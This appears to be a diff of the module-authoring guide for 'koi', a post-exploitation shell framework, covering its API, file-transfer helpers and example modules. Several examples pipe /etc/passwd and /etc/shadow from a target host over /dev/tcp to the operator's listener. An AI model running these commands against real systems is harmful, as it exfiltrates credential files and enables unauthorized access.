@@ -11,7 +11,7 @@
         <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/make-your-modules/">
       
       
-        <link rel="prev" href="../upgrading-sessions/">
+        <link rel="prev" href="../logs/">
       
       
         <link rel="next" href="../future-updates/">
@@ -261,14 +261,14 @@
   
   
     <li class="md-nav__item">
-      <a href="../payloads/" class="md-nav__link">
+      <a href="../getting-started/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
     
   
-    Generate Payloads
+    Getting Started
   
 
     
@@ -283,6 +283,137 @@
     
       
       
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Usage
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Usage
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cli-reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sessions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Session Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../payloads/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Payloads & Obfuscation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
   
   
   
@@ -304,6 +435,70 @@
   
 
       </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../modules/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Built-in Modules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../logs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Logging & Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
     </li>
   
 
@@ -463,7 +658,7 @@
   <a href="#selfexeccommand-timeout300-commandresult" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.exec(command, timeout=30.0) → CommandResult
+        self.exec(command, timeout=30.0) -&gt; CommandResult
       
     </span>
   </a>
@@ -474,7 +669,7 @@
   <a href="#selfexec_streamcommand-timeout300-iteratorstreamline" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.exec_stream(command, timeout=30.0) → Iterator[StreamLine]
+        self.exec_stream(command, timeout=30.0) -&gt; Iterator[StreamLine]
       
     </span>
   </a>
@@ -485,7 +680,7 @@
   <a href="#self_exec_cleancmd-timeout100-str" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self._exec_clean(cmd, timeout=10.0) → str
+        self._exec_clean(cmd, timeout=10.0) -&gt; str
       
     </span>
   </a>
@@ -513,7 +708,7 @@
   <a href="#self_win_queryps_expr-timeout100-str" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self._win_query(ps_expr, timeout=10.0) → str
+        self._win_query(ps_expr, timeout=10.0) -&gt; str
       
     </span>
   </a>
@@ -541,7 +736,7 @@
   <a href="#spawn_recv_servertimeout-port-collect_fn" class="md-nav__link">
     <span class="md-ellipsis">
       
-        spawn_recv_server(timeout) → (port, collect_fn)
+        spawn_recv_server(timeout) -&gt; (port, collect_fn)
       
     </span>
   </a>
@@ -552,7 +747,18 @@
   <a href="#spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors" class="md-nav__link">
     <span class="md-ellipsis">
       
-        spawn_send_server(raw_bytes, timeout, on_progress=None) → (port, thread, errors)
+        spawn_send_server(raw_bytes, timeout, on_progress=None) -&gt; (port, thread, errors)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcpreceiveserver-recommended-for-downloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TCPReceiveServer (recommended for downloads)
       
     </span>
   </a>
@@ -652,7 +858,7 @@
   <a href="#self_get_local_ip-str" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self._get_local_ip() → str
+        self._get_local_ip() -&gt; str
       
     </span>
   </a>
@@ -663,7 +869,7 @@
   <a href="#selfsenddata-bytes-bool" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.send(data: bytes) → bool
+        self.send(data: bytes) -&gt; bool
       
     </span>
   </a>
@@ -674,7 +880,7 @@
   <a href="#selfsendlineline-str-encodingutf-8-bool" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.sendline(line: str, encoding="utf-8") → bool
+        self.sendline(line: str, encoding="utf-8") -&gt; bool
       
     </span>
   </a>
@@ -996,7 +1202,7 @@
   <a href="#selfexeccommand-timeout300-commandresult" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.exec(command, timeout=30.0) → CommandResult
+        self.exec(command, timeout=30.0) -&gt; CommandResult
       
     </span>
   </a>
@@ -1007,7 +1213,7 @@
   <a href="#selfexec_streamcommand-timeout300-iteratorstreamline" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.exec_stream(command, timeout=30.0) → Iterator[StreamLine]
+        self.exec_stream(command, timeout=30.0) -&gt; Iterator[StreamLine]
       
     </span>
   </a>
@@ -1018,7 +1224,7 @@
   <a href="#self_exec_cleancmd-timeout100-str" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self._exec_clean(cmd, timeout=10.0) → str
+        self._exec_clean(cmd, timeout=10.0) -&gt; str
       
     </span>
   </a>
@@ -1046,7 +1252,7 @@
   <a href="#self_win_queryps_expr-timeout100-str" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self._win_query(ps_expr, timeout=10.0) → str
+        self._win_query(ps_expr, timeout=10.0) -&gt; str
       
     </span>
   </a>
@@ -1074,7 +1280,7 @@
   <a href="#spawn_recv_servertimeout-port-collect_fn" class="md-nav__link">
     <span class="md-ellipsis">
       
-        spawn_recv_server(timeout) → (port, collect_fn)
+        spawn_recv_server(timeout) -&gt; (port, collect_fn)
       
     </span>
   </a>
@@ -1085,7 +1291,18 @@
   <a href="#spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors" class="md-nav__link">
     <span class="md-ellipsis">
       
-        spawn_send_server(raw_bytes, timeout, on_progress=None) → (port, thread, errors)
+        spawn_send_server(raw_bytes, timeout, on_progress=None) -&gt; (port, thread, errors)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcpreceiveserver-recommended-for-downloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TCPReceiveServer (recommended for downloads)
       
     </span>
   </a>
@@ -1185,7 +1402,7 @@
   <a href="#self_get_local_ip-str" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self._get_local_ip() → str
+        self._get_local_ip() -&gt; str
       
     </span>
   </a>
@@ -1196,7 +1413,7 @@
   <a href="#selfsenddata-bytes-bool" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.send(data: bytes) → bool
+        self.send(data: bytes) -&gt; bool
       
     </span>
   </a>
@@ -1207,7 +1424,7 @@
   <a href="#selfsendlineline-str-encodingutf-8-bool" class="md-nav__link">
     <span class="md-ellipsis">
       
-        self.sendline(line: str, encoding="utf-8") → bool
+        self.sendline(line: str, encoding="utf-8") -&gt; bool
       
     </span>
   </a>
@@ -1499,12 +1716,12 @@
     <span class="n">out</span>  <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">output</span>                 <span class="c1"># optional flag</span>
     <span class="n">all_</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">all</span>                    <span class="c1"># boolean flag</span>
 </code></pre></div>
-<p>Raw (unparsed) arguments are also available as <code>self.raw_args</code> (a <code>list[str]</code>), which is useful for simple checks like <code>if "all" in self.raw_args</code>.</p>
+<p>Raw (unparsed) arguments are also available as <code>self.raw_args</code> (a <code>list[str]</code>), but prefer <code>arguments</code> + <code>self.args</code> for all flags - it gives you proper help text, type coercion, and consistency with the rest of the framework.</p>
 <hr />
 <h2 id="core-api-reference">Core API Reference</h2>
 <p>All helpers are available as <code>self.&lt;method&gt;</code> inside <code>run()</code>.</p>
 <h3 id="executing-commands">Executing Commands</h3>
-<h4 id="selfexeccommand-timeout300-commandresult"><code>self.exec(command, timeout=30.0) → CommandResult</code></h4>
+<h4 id="selfexeccommand-timeout300-commandresult"><code>self.exec(command, timeout=30.0) -&gt; CommandResult</code></h4>
 <p>Runs a shell command on the remote Linux session and blocks until it completes or times out. Returns a <code>CommandResult</code> with:</p>
 <ul>
 <li><code>.stdout</code> - full output as a string</li>
@@ -1522,19 +1739,19 @@
 <blockquote>
 <p><strong>Note:</strong> <code>exec</code> uses a sentinel marker appended to the command, so it works correctly even on raw/non-PTY shells. <strong>Do not use it on Windows sessions</strong> - use <code>_win_query</code> instead.</p>
 </blockquote>
-<h4 id="selfexec_streamcommand-timeout300-iteratorstreamline"><code>self.exec_stream(command, timeout=30.0) → Iterator[StreamLine]</code></h4>
+<h4 id="selfexec_streamcommand-timeout300-iteratorstreamline"><code>self.exec_stream(command, timeout=30.0) -&gt; Iterator[StreamLine]</code></h4>
 <p>Like <code>exec</code> but yields output line by line as <code>StreamLine</code> objects (<code>.text</code> attribute). Useful for long-running commands where you want to display progress in real time.</p>
 <div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">exec_stream</span><span class="p">(</span><span class="s2">&quot;find / -name &#39;*.conf&#39; 2&gt;/dev/null&quot;</span><span class="p">):</span>
     <span class="bp">self</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="n">line</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div>
-<h4 id="self_exec_cleancmd-timeout100-str"><code>self._exec_clean(cmd, timeout=10.0) → str</code></h4>
+<h4 id="self_exec_cleancmd-timeout100-str"><code>self._exec_clean(cmd, timeout=10.0) -&gt; str</code></h4>
 <p>Runs a Linux command and collects its output via a <strong>side TCP channel</strong> instead of reading it from the shell stream. This is the preferred method when the output needs to be parsed programmatically, because it bypasses any prompt noise or ANSI codes.</p>
 <div class="highlight"><pre><span></span><code><span class="n">arch</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_exec_clean</span><span class="p">(</span><span class="s2">&quot;uname -m&quot;</span><span class="p">)</span>
 <span class="n">size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_exec_clean</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;wc -c &lt; </span><span class="si">{</span><span class="n">quoted_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 </code></pre></div>
 <p>Internally it redirects stdout to <code>/dev/tcp/&lt;local_ip&gt;/&lt;port&gt;</code> and collects the bytes on a local socket.</p>
 <h3 id="windows-helpers">Windows Helpers</h3>
-<h4 id="self_win_queryps_expr-timeout100-str"><code>self._win_query(ps_expr, timeout=10.0) → str</code></h4>
+<h4 id="self_win_queryps_expr-timeout100-str"><code>self._win_query(ps_expr, timeout=10.0) -&gt; str</code></h4>
 <p>Evaluates a PowerShell expression on a <strong>Windows</strong> target and returns its string output. Handles both plain and upgraded (ConPtyShell) sessions transparently:</p>
 <ul>
 <li>On plain sessions it injects a sentinel marker to delimit the output inline.</li>
@@ -1542,7 +1759,7 @@
 </ul>
 <div class="highlight"><pre><span></span><code><span class="c1"># Check file existence</span>
 <span class="n">exists</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_win_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;(Test-Path &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39;).ToString()&quot;</span><span class="p">)</span>
-<span class="c1"># → &quot;True&quot; or &quot;False&quot;</span>
+<span class="c1"># -&gt; &quot;True&quot; or &quot;False&quot;</span>
 
 <span class="c1"># Get file size</span>
 <span class="n">size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_win_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;(Get-Item &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39;).Length&quot;</span><span class="p">)</span>
@@ -1555,7 +1772,7 @@
 </blockquote>
 <h3 id="file-transfer-helpers">File Transfer Helpers</h3>
 <p>These are not methods of <code>KoiModule</code> directly, but utilities from <code>koi.utils.tcp</code> that module authors use together with <code>exec</code> or <code>_win_query</code>/<code>_send_ps</code> to transfer binary data.</p>
-<h4 id="spawn_recv_servertimeout-port-collect_fn"><code>spawn_recv_server(timeout) → (port, collect_fn)</code></h4>
+<h4 id="spawn_recv_servertimeout-port-collect_fn"><code>spawn_recv_server(timeout) -&gt; (port, collect_fn)</code></h4>
 <p>Opens a local TCP listener on a random port and returns:
 - <code>port</code> - the port number to give to the remote side
 - <code>collect_fn</code> - a callable that blocks until the data arrives and returns it as <code>bytes</code></p>
@@ -1566,7 +1783,7 @@
 <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;cat /etc/passwd &gt; /dev/tcp/</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 <span class="n">data</span> <span class="o">=</span> <span class="n">collect</span><span class="p">()</span>   <span class="c1"># bytes</span>
 </code></pre></div>
-<h4 id="spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors"><code>spawn_send_server(raw_bytes, timeout, on_progress=None) → (port, thread, errors)</code></h4>
+<h4 id="spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors"><code>spawn_send_server(raw_bytes, timeout, on_progress=None) -&gt; (port, thread, errors)</code></h4>
 <p>Opens a local TCP listener and serves <code>raw_bytes</code> to the first client that connects. Returns:
 - <code>port</code> - port to connect to from the remote side
 - <code>thread</code> - the serving thread (join it to wait for completion)
@@ -1587,6 +1804,72 @@
 <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
 <span class="k">if</span> <span class="n">errors</span><span class="p">:</span>
     <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Upload failed: </span><span class="si">{</span><span class="n">errors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="tcpreceiveserver-recommended-for-downloads"><code>TCPReceiveServer</code> (recommended for downloads)</h4>
+<p>A class-based alternative to <code>spawn_recv_server</code> that provides a cleaner interface and built-in progress tracking. Import it from <code>blueprint</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">koi.modules.blueprint</span><span class="w"> </span><span class="kn">import</span> <span class="n">KoiModule</span><span class="p">,</span> <span class="n">TCPReceiveServer</span>
+</code></pre></div>
+<p><strong>Constructor:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">TCPReceiveServer</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">,</span> <span class="n">on_progress</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>timeout</code></td>
+<td>Seconds to wait for a connection and complete transfer</td>
+</tr>
+<tr>
+<td><code>on_progress</code></td>
+<td>Optional callback <code>fn(bytes_received: int)</code> called after each chunk</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Methods:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Returns</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.start()</code></td>
+<td><code>self</code></td>
+<td>Binds the socket, starts the background thread. Sets <code>.port</code>.</td>
+</tr>
+<tr>
+<td><code>.collect()</code></td>
+<td><code>bytes</code></td>
+<td>Blocks until transfer completes. Raises <code>RuntimeError</code> or <code>TimeoutError</code> on failure.</td>
+</tr>
+<tr>
+<td><code>.stop()</code></td>
+<td>-</td>
+<td>Closes the socket. Called automatically on context manager exit.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>As a context manager:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="k">with</span> <span class="n">TCPReceiveServer</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span> <span class="k">as</span> <span class="n">srv</span><span class="p">:</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">port</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;cat /etc/shadow &gt; /dev/tcp/</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">collect</span><span class="p">()</span>
+</code></pre></div>
+<p><strong>With progress bar:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">bar</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ui</span><span class="o">.</span><span class="n">ProgressBar</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="n">file_size</span><span class="p">)</span>
+<span class="n">srv</span> <span class="o">=</span> <span class="n">TCPReceiveServer</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="n">on_progress</span><span class="o">=</span><span class="n">bar</span><span class="o">.</span><span class="n">update</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">port</span>
+<span class="c1"># … trigger remote transfer …</span>
+<span class="n">raw</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">collect</span><span class="p">()</span>
+<span class="n">bar</span><span class="o">.</span><span class="n">done</span><span class="p">()</span>
 </code></pre></div>
 <h3 id="output-notifications">Output &amp; Notifications</h3>
 <h4 id="selfokmsg-selferrmsg-selfwarnmsg-selfstatusmsg-selfsuccessmsg"><code>self.ok(msg)</code> / <code>self.err(msg)</code> / <code>self.warn(msg)</code> / <code>self.status(msg)</code> / <code>self.success(msg)</code></h4>
@@ -1645,13 +1928,13 @@
 <span class="n">bar</span><span class="o">.</span><span class="n">done</span><span class="p">()</span>
 </code></pre></div>
 <h3 id="networking-utilities">Networking Utilities</h3>
-<h4 id="self_get_local_ip-str"><code>self._get_local_ip() → str</code></h4>
+<h4 id="self_get_local_ip-str"><code>self._get_local_ip() -&gt; str</code></h4>
 <p>Returns the local IP address that routes toward the session's remote host. Always use this instead of hardcoding <code>127.0.0.1</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="n">local_ip</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_local_ip</span><span class="p">()</span>
 </code></pre></div>
-<h4 id="selfsenddata-bytes-bool"><code>self.send(data: bytes) → bool</code></h4>
+<h4 id="selfsenddata-bytes-bool"><code>self.send(data: bytes) -&gt; bool</code></h4>
 <p>Write raw bytes directly to the session socket. Returns <code>False</code> if the session is dead.</p>
-<h4 id="selfsendlineline-str-encodingutf-8-bool"><code>self.sendline(line: str, encoding="utf-8") → bool</code></h4>
+<h4 id="selfsendlineline-str-encodingutf-8-bool"><code>self.sendline(line: str, encoding="utf-8") -&gt; bool</code></h4>
 <p>Encode <code>line + "\n"</code> and send it. Shorthand for <code>self.send((line + "\n").encode(encoding))</code>.</p>
 <hr />
 <h2 id="writing-your-first-module">Writing Your First Module</h2>
@@ -1740,18 +2023,27 @@
         <span class="n">username</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">shell</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span>
         <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;uid=</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s2">  shell=</span><span class="si">{</span><span class="n">shell</span><span class="si">}</span><span class="s2">&quot;</span>
 
-    <span class="k">if</span> <span class="s2">&quot;all&quot;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">raw_args</span><span class="p">:</span>
+    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">all</span><span class="p">:</span>
         <span class="bp">self</span><span class="o">.</span><span class="n">box</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;All users (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">users</span><span class="p">)</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="n">users</span><span class="p">)</span>
-    <span class="c1"># filter to only login shells</span>
     <span class="n">interesting</span> <span class="o">=</span> <span class="p">{</span><span class="n">u</span><span class="p">:</span> <span class="n">v</span> <span class="k">for</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">users</span><span class="o">.</span><span class="n">items</span><span class="p">()</span>
                    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">s</span> <span class="ow">in</span> <span class="n">v</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s2">&quot;/bin/zsh&quot;</span><span class="p">])}</span>
     <span class="k">if</span> <span class="n">interesting</span><span class="p">:</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">box</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">interesting</span><span class="p">)</span><span class="si">}</span><span class="s2"> interesting users&quot;</span><span class="p">,</span> <span class="n">interesting</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">box</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Interesting users (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">interesting</span><span class="p">)</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="n">interesting</span><span class="p">)</span>
+</code></pre></div>
+<p>With the corresponding <code>arguments</code> declaration:</p>
+<div class="highlight"><pre><span></span><code><span class="n">arguments</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">{</span>
+        <span class="s2">&quot;flags&quot;</span><span class="p">:</span>  <span class="p">[</span><span class="s2">&quot;-a&quot;</span><span class="p">,</span> <span class="s2">&quot;--all&quot;</span><span class="p">],</span>
+        <span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;store_true&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;default&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+        <span class="s2">&quot;help&quot;</span><span class="p">:</span>   <span class="s2">&quot;Show all users, not just those with a login shell.&quot;</span><span class="p">,</span>
+    <span class="p">},</span>
+<span class="p">]</span>
 </code></pre></div>
 <p><strong>Key takeaways:</strong>
 - Use <code>self.exec()</code> for Linux commands.
 - Check <code>result.success</code> before processing output.
-- Use <code>self.raw_args</code> for simple on/off flags that don't need <code>argparse</code>.</p>
+- Declare all flags via <code>arguments</code> - access them with <code>self.args</code>.</p>
 <hr />
 <h3 id="cross-platform-module-get_processes">Cross-platform Module - get_processes</h3>
 <p><code>get_processes</code> demonstrates the standard cross-platform pattern: branch on <code>self.session.os_type</code>, use <code>_exec_clean</code> for Linux and <code>_win_query</code> for Windows.</p>
@@ -1783,37 +2075,32 @@
 - Wrap slow queries in <code>self.spinner()</code>.</p>
 <hr />
 <h3 id="file-transfer-module-download">File Transfer Module - download</h3>
-<p><code>download</code> shows how to set up a local TCP listener and trigger the remote machine to connect and send a file.</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># 1. Open a local TCP listener</span>
-<span class="n">srv</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
-<span class="n">srv</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-<span class="n">port</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+<p><code>download</code> shows how to use <code>TCPReceiveServer</code> to collect a file sent by the remote machine.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">koi.modules.blueprint</span><span class="w"> </span><span class="kn">import</span> <span class="n">KoiModule</span><span class="p">,</span> <span class="n">TCPReceiveServer</span>
 
-<span class="c1"># 2. Start collecting in a background thread</span>
-<span class="k">def</span><span class="w"> </span><span class="nf">_recv</span><span class="p">():</span>
-    <span class="n">conn</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
-    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
-    <span class="k">while</span> <span class="n">chunk</span> <span class="o">:=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">65536</span><span class="p">):</span>
-        <span class="n">buf</span> <span class="o">+=</span> <span class="n">chunk</span>
-    <span class="n">received</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="c1"># 1. Open a local TCP listener with optional progress tracking</span>
+<span class="n">bar</span>  <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ui</span><span class="o">.</span><span class="n">ProgressBar</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="n">remote_size</span> <span class="ow">or</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">srv</span>  <span class="o">=</span> <span class="n">TCPReceiveServer</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="n">on_progress</span><span class="o">=</span><span class="n">bar</span><span class="o">.</span><span class="n">update</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">port</span>
 
-<span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">_recv</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-
-<span class="c1"># 3. Tell the remote machine to send the file</span>
+<span class="c1"># 2. Tell the remote machine to send the file</span>
 <span class="k">if</span> <span class="n">os_type</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">:</span>
     <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;cat </span><span class="si">{</span><span class="n">quoted</span><span class="si">}</span><span class="s2"> &gt; /dev/tcp/</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
-    <span class="c1"># PowerShell TCP write</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>  <span class="c1"># PowerShell TcpClient write</span>
 
-<span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+<span class="c1"># 3. Collect and write to disk</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="n">srv</span><span class="o">.</span><span class="n">collect</span><span class="p">()</span>   <span class="c1"># blocks; raises RuntimeError/TimeoutError on failure</span>
